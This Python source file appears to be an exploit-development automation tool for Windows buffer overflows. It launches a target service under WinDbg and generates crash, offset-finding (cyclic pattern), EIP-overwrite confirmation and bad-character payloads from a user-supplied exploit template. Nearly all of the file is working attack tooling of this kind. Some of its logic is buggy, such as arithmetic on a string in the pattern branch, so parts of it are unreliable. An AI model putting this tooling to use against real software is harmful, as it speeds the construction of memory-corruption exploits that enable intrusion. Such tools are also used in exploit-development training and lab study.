import sys, os
import time
import pattern
import subprocess
from multiprocessing import Process
import ApplicationHandler

size = ""
inputBuffer = ""
index = 0
exploitDelay = 2
#badCharList = ['0','10','13']
badCharList = ['0']
modAllChar = 0
ah = ApplicationHandler.runApplication()

sentChars=bytearray()

allChars = (
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

class exploitHandler:

    def runModExploit(mode, exploitDelay):
        time.sleep(exploitDelay)               #Increase time if debugger unable to attach to process. It might be due to app crashing before attached to windbg
        currPath = os.path.abspath('.')
        cmd = "python "+currPath+"\\exploitFiles\\exploit-"+mode+".py"
        #p = subprocess.Popen(cmd)                      # Use this if you want exploit output to be displayed.
        p = subprocess.Popen(cmd,stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        print("[*]Exploit triggered!")

    def findBadChar(appName,badCharList):
        #print("Bad char list is: "+str(badCharList))
        time.sleep(2)
        startTime = time.time()

        pid=ah.startService(appName)
        Process(target=exploitHandler.runModExploit,args=["findBadChar",exploitDelay]).start()
        winDBGcmd = "!py "+os.path.abspath('.')+"\\templates\\findBadChar.py;g"
        windbgProc=ah.launchWindbg(pid,winDBGcmd)

        while not os.path.exists('status.txt'):
            if time.time() - startTime > exploitDelay + 5:
                print("[!]Time more than "+str(exploitDelay + 5)+" sec! No crash!")
                windbgProc.kill()
                return False
            time.sleep(2)

        if os.stat('status.txt').st_size !=0:
            f=open("status.txt",'r')
            bchar=f.readlines()
            f.close()

        if bchar[0]:
                #print('*'*10+'Application crash index obtained at: '+index[0]+'!'+'*'*10)
                #print("\t[+]Bad char found: "+bchar[0])
                os.remove("status.txt")
                windbgProc.kill()
                if bchar[0] == 'True':
                    print("\t[+]No bad chars in this array!")
                    return True
                else:
                    badCharList.append(bchar[0])
                    
                    #exploitHandler.parseeFile(eFile,"findBadChar")
                    #exploitHandler.findBadChar(appName,badCharList)
                    #print("\t\t[*]Bad char found!"+bchar[0])
                    return bchar[0]
                #return bchar[0]
        else:
                print('*'*10+'BadChar error!'+'*'*10)
                os.remove("status.txt")
                windbgProc.kill()
                return False

    def confirmIndex(appName):
        #print("Confirming index!")
        time.sleep(2)
        startTime = time.time()

        pid=ah.startService(appName)
        Process(target=exploitHandler.runModExploit,args=["confirmIndex",exploitDelay]).start()
        winDBGcmd = "!py "+os.path.abspath('.')+"\\templates\\confirmIndex.py;g"
        windbgProc=ah.launchWindbg(pid,winDBGcmd)

        while not os.path.exists('status.txt'):
            if time.time() - startTime > exploitDelay + 5:
                print("[!]Time more than "+str(exploitDelay + 5)+" sec! Exploit failed")
                windbgProc.kill()
                return False
            time.sleep(2)
        if os.stat('status.txt').st_size !=0:
            f=open("status.txt",'r')
            offset=f.readlines()
            f.close()
        
        #print(offset[0])

        if offset[0]:
            #print('*'*10+'Application crash index confirmed! Offset found at: '+offset[0]+'*'*10)
            if offset[0] == "True":
                print("\t[+]Application index confirmed!(SEH based)")
            else:
                print("\t[+]Application offset is at: "+offset[0])
            os.remove("status.txt")
            windbgProc.kill()
            return offset[0]
        else:
            print("Crash index incorrect!")
            os.remove("status.txt")
            windbgProc.kill()
            return False

    def findIndex(appName):
        
        #print("Finding IP index!")

        startTime = time.time()

        pid=ah.startService(appName)
        Process(target=exploitHandler.runModExploit,args=["findIndex",exploitDelay]).start()
        winDBGcmd = "!py "+os.path.abspath('.')+"\\templates\\findIndex.py;g"
        windbgProc=ah.launchWindbg(pid,winDBGcmd)


        while not os.path.exists('status.txt'):
            if time.time() - startTime > exploitDelay + 5:
                print("[!]Time more than "+str(exploitDelay + 5)+" sec! Exploit failed")
                windbgProc.kill()
                return False
            time.sleep(2)

        if os.stat('status.txt').st_size !=0:
            f=open("status.txt",'r')
            index=f.readlines()
            f.close()
        #print(index)

            if index[0]:
                #print('*'*10+'Application crash index obtained at: '+index[0]+'!'+'*'*10)
                print("\t[+]Application index found: "+index[0])
                os.remove("status.txt")
                windbgProc.kill()
                return index[0]
            else:
                print('*'*10+'Index error!'+'*'*10)
                os.remove("status.txt")
                windbgProc.kill()
                return False

    def crash(appName):
        print("[*]Crashing!")

        startTime = time.time()

        pid=ah.startService(appName)
        Process(target=exploitHandler.runModExploit,args=["crash",exploitDelay]).start()
        winDBGcmd = "!py "+os.path.abspath('.')+"\\templates\\crash.py;g"
        windbgProc=ah.launchWindbg(pid,winDBGcmd)


        while not os.path.exists('status.txt'):
            if time.time() - startTime > exploitDelay+5:
                print("Exploit exceeded 5 sec! Exploit failed")
                windbgProc.kill()
                return False
            time.sleep(2)
        if os.stat('status.txt').st_size !=0:
            f=open("status.txt",'r')
            status=f.readlines()
            f.close()
        
        #print(status[0])

        if status[0].strip() == 'True':
            #print('*'*10+'Application crashed successfully for fuzz!'+'*'*10)
            #print("[+]Application crashed on fuzzing!")
            try:
                if status[1]:
                    print("\t[+]SEH based!")
            except:
                pass
                
            os.remove("status.txt")
            windbgProc.kill()
            return True
        else:
            #print("[-]Fuzz crash failed")
            os.remove("status.txt")
            windbgProc.kill()
            return False

    def parseeFile(eFile,mode):
        
        global size
        global inputBuffer
        global index
        global allChars
        

        #print("Parsing eFile: "+eFile)
        #print("Mode: "+mode)

        ecFile = ".\\exploitFiles\\exploit-"+mode+".py"
        #print("EcFile is "+ecFile)

        f2=open(eFile,'r')
        f3=open(ecFile,'w')

        for efline in f2:
            #efline = "    "+efline
            if "index =" in efline:
                index=efline.strip().split('=')[-1]
                index=int(index)
                #f3.write(efline)

            if "size =" in efline:
                size=efline.strip().split('=')[-1]
                if '0x' in size:
                    size = int(size,16)
                else:
                    size=int(size)
                f3.write(efline)
            elif "inputBuffer" in efline and 'size' in efline:
                inputBuffer=efline
                #print("\t[+]Buffer is: "+inputBuffer)
                if mode == "findIndex":
                    inputBuffer=efline.split('=')[0] + "= "
                    if size > 20280:
                        print("\t\t\t\t[!]Size too big only testing first 20280 chars!")
                        s=str(pattern.pattern_gen(20280)).encode('ascii') + str("\x41" * (size)-20280).encode('ascii')
                    else:
                        s=str(pattern.pattern_gen(size)).encode('ascii')
                    inputBuffer+=str(s)
                    inputBuffer+="\r\n"
                    
                elif mode == "confirmIndex":
                    inputBuffer=efline.split('=')[0] + "= "
                    filler1 = b"A" * int(index)
                    eip = b"B" * 4
                    filler2 = b"C" * (size - len(filler1) - len(eip))
                    inputBuffer+=str(filler1 + eip + filler2)
                    inputBuffer+="\r\n"

                elif mode == "findBadChar":             #Is there Something similar to Binary search algorithm for this :( 
                    if index == 0:
                        print("Index is 0! Exiting!")
                        sys.exit()
                    
                    inputBuffer=efline.split('=')[0] + "= "
                    filler1 = b"A"
                    eip = b"B" * 4
                    filler2 = b"C" 
                    tag = b"w00tw00t" 
                    
                    
                    """if modAllChar == 6:
                        newChars = allChars[0:16]"""
                        #print("new chars"+str(newChars))
                        #print(modAllChar)
                    if modAllChar:
                        newChars = allChars[((modAllChar-1)*16):((modAllChar-1)*16)+16]
                        print("\t[*]Array set to %d sending index %d"%(modAllChar,((modAllChar-1)*16)))
                    elif modAllChar == 16:
                        newChars = allChars[((modAllChar-1)*16):]
                        #print("\tArray set to %d sending index %d"%(modAllChar,((modAllChar-1)*16)))
                        #print("new chars"+str(newChars))
                        #print(modAllChar)
                    else:
                        newChars = allChars
                        #print("new chars"+str(newChars))
                        #print(modAllChar)
                    
                    #print("Ranges for all chars"+str(((modAllChar-1)*16))+":"+str(((modAllChar-1)*16)+16))
                        
                    #print("Sent before:"+str(sentChars))
                    for i in range(len(newChars)):
                        #print("Sent char value:"+str(allChars[i]))
                        #print("i is:"+str(i))
                        Copyflag=True
                        for j in badCharList:
                            #print("Sent char value:"+j)
                            #print("j is:"+str(j))
                            if j !='' and int(j)==newChars[i]:
                                #print("match found!"+j)
                                Copyflag=False
                        if Copyflag:
                            #print("Appending:"+str(allChars[i]))
                            sentChars.append(int(newChars[i]))
                    #print("\t[*]Sent chars: "+str(sentChars))
                    if size - index > 263:
                        #print("\t[*]Post index")
                        setBuff = filler1 * int(index) + eip + tag + sentChars
                        f3.write("\n  #fillerA = "+str(filler1 * int(index)) +"\n  #eip = "+str(eip) + "\n  #tag = "+str(tag))
                        #f3.write("\n  #sentByteArray = "+str(sentChars))
                        f3.write("\n  #fillerC = "+str(filler2 * (size - len(setBuff))))
                        setBuff += filler2 * (size - len(setBuff))
                        inputBuffer+=str(setBuff)
                    elif index > 252:#index > 263:
                        print("\t[*]Pre index")
                        setBuff = tag + sentChars
                        f3.write("\n  #tag = "+str(tag))
                        #f3.write("\n  #sentByteArray = "+str(sentChars))
                        f3.write("\n  #fillerA = "+str(filler1 * (int(index) -len(setBuff))) +"\n  #eip = "+str(eip))   # Should be always before +> setBuff += ...
                        setBuff += filler1 * (int(index) -len(setBuff))+ eip
                        f3.write("\n  #fillerC = "+str(filler2 * (size - len(setBuff))))                      
                        setBuff += filler2 * (size - len(setBuff))
                        inputBuffer+=str(setBuff)
                    #f3.write("\n  #setBuffer = "+str(setBuff))
                    #inputBuffer=efline.split('=')[0] + "= "
                    inputBuffer+="\r\n"
                    f3.write("\n  #sentChars = ")
                    for i in sentChars:
                        f3.write(str(i)+",")
                    f3.write("\n")
                #print(inputBuffer)
                
                f3.write(inputBuffer)
            else:
                f3.write(efline)
        
        f3.write("\nf=open('exploitStatus.txt','w')\n")
        f3.write("f.write('True')\n")
        f3.write("f.close()\n")

        f3.close()
        f2.close()

        if not (size or inputBuffer): 
                print("[-]Size or inputBuffer not found! Exiting!")
                sys.exit()


    def findBadCharIndexes(appName,eFile):
        print("Finding Indexes with Bad char!")
        global sentChars
        global badCharList
        global modAllChar

        mode = 'findBadChar'
        
        findBadCharflag = True
        sentChars=bytearray()
        multipleFail = []
        #bcresult = exploitHandler.findBadChar(appName,badCharList)
        #exploitHandler.parseeFile(eFile,mode)
        failedAttempts = 0
        while findBadCharflag:
            
            bcresult = exploitHandler.findBadChar(appName,badCharList)
            if bcresult == False:
                #print(badCharList) 
                if failedAttempts == 2:
                    print("\t[-]Multiple fail on:"+str(modAllChar))
                    if modAllChar != 0:
                        multipleFail.append(modAllChar)
                    failedAttempts = 0
                    modAllChar+=1
                    #print("\tfailedAttempts:"+str(failedAttempts))
                    exploitHandler.parseeFile(eFile,mode) 
                    sentChars=bytearray()
                    
                else:
                    failedAttempts +=1
            elif bcresult == True and (modAllChar == 0 or modAllChar == 16):
                findBadCharflag = False
                break
            else:
                #print("Added bcresult:"+bcresult)
                #badCharList += str(bcresult)
                if bcresult == True and modAllChar != 0 and modAllChar < 16:
                    failedAttempts = 0
                    modAllChar+=1
                exploitHandler.parseeFile(eFile,mode) 
                sentChars=bytearray()
        
        print("Manual check needed for below chars!")
        k=''
        for i in multipleFail:
            for j in allChars[((i-1)*16):((i-1)*16)+16]:  k += "\\x{:02x}".format(int(j))+""
        print(k)
            
        


    def exploit(appName,mode,eFile,eDelay):

        print("[*]Starting exploit!")

        global exploitDelay 
        global index


        exploitDelay = int(eDelay)
        #print(mode)

        if mode == "crash":
            #print("Crashing!")
            #tempFile = ".\\templates\\crash.py"
            exploitHandler.parseeFile(eFile,mode)
            if exploitHandler.crash(appName):
                print("\t[+]Application crashed successfully!")
            else:
                print("[-]Application crash failed")
        elif mode == "findIndex":
            #global index
            #tempFile = ".\\templates\\findIndex.py"
            failedAttempts = 0
            exploitHandler.parseeFile(eFile,mode)
            print("\t[+]Buffer size is: "+str(size)) 
            while failedAttempts < 3:
                index = exploitHandler.findIndex(appName)
                if index:
                    break
                else:
                    print("\t[-]Attempt no. "+str(failedAttempts)+" failed!")
                    failedAttempts += 1
            if not index:
                print("\t[-]Index not found! Multiple fails!")
            else:
                print("\t[*]Best of luck with that! :)")
                
        elif mode == "findBadChar":
            
            #modAllChar = 2
            #tempFile = ".\\templates\\findBadChar.py"
            
            exploitHandler.parseeFile(eFile,mode) 
            print("\t[+]Buffer size is: "+str(size))
            exploitHandler.findBadCharIndexes(appName,eFile)
            
            
            



        